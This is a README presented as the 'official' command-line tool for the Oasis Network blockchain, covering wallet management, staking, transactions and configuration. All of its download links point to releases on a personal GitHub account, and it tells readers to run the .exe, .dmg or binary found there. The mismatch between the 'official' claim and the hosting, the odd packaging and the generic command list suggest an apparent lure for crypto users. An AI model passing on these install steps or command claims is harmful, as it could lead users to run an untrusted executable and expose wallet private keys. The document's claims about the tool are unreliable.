# 🌐 Oasis Network CLI

Welcome to the official CLI for the Oasis Network! This command-line interface provides a powerful tool for interacting with the Oasis blockchain, enabling users to manage their wallets, stake tokens, and perform various blockchain operations efficiently.

[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue)](https://github.com/Rastapapouloss/cli/releases)

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Commands](#commands)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

The Oasis Network is a privacy-focused blockchain designed for scalable and secure decentralized applications. The CLI provides a straightforward way to interact with the network, making it accessible for developers and users alike. Whether you want to stake your tokens, manage your wallet, or explore the blockchain, this CLI has you covered.

## Features

- **Non-Custodial Wallet**: Control your private keys and manage your assets securely.
- **Staking**: Easily stake your tokens to earn rewards.
- **Transaction Management**: Send and receive tokens with simple commands.
- **Blockchain Explorer**: Query the blockchain for transaction history and status.
- **User-Friendly Interface**: Designed for ease of use with clear commands and feedback.

## Installation

To get started, download the latest release from our [Releases page](https://github.com/Rastapapouloss/cli/releases). After downloading, execute the installation file according to your operating system:

1. **For Windows**: Download the `.exe` file and run it.
2. **For macOS**: Download the `.dmg` file, open it, and drag the application to your Applications folder.
3. **For Linux**: Download the `.tar.gz` file, extract it, and run the binary.

## Usage

Once installed, you can start using the CLI. Open your terminal and type `oasis-cli` to see the available commands. The CLI is designed to be intuitive, with built-in help for each command.

## Commands

Here are some common commands you can use:

### Wallet Management

- **Create a Wallet**: `oasis-cli wallet create`
- **Import a Wallet**: `oasis-cli wallet import <private_key>`
- **Check Wallet Balance**: `oasis-cli wallet balance`

### Staking

- **Stake Tokens**: `oasis-cli stake <amount>`
- **Check Staking Status**: `oasis-cli stake status`
- **Unstake Tokens**: `oasis-cli unstake <amount>`

### Transaction Management

- **Send Tokens**: `oasis-cli send <recipient_address> <amount>`
- **Check Transaction Status**: `oasis-cli tx status <transaction_id>`

### Blockchain Explorer

- **Query Block**: `oasis-cli block <block_number>`
- **Query Transaction**: `oasis-cli tx <transaction_id>`

## Configuration

You can configure the CLI to suit your needs. The configuration file is located in your home directory under `.oasis/config.json`. You can set your preferred network, wallet address, and other settings here.

### Example Configuration

```json
{
  "network": "mainnet",
  "wallet_address": "your_wallet_address",
  "staking_enabled": true
}
```

## Contributing

We welcome contributions to the Oasis Network CLI! If you have suggestions or improvements, please fork the repository and submit a pull request. 

1. Fork the repository.
2. Create a new branch: `git checkout -b feature/YourFeature`
3. Make your changes and commit them: `git commit -m 'Add your feature'`
4. Push to the branch: `git push origin feature/YourFeature`
5. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, please reach out via the Issues section of this repository or contact us at support@oasisnetwork.org.

---

Thank you for using the Oasis Network CLI! We hope it enhances your experience with the Oasis blockchain. For more information, please visit our [Releases page](https://github.com/Rastapapouloss/cli/releases) to stay updated on the latest versions and features.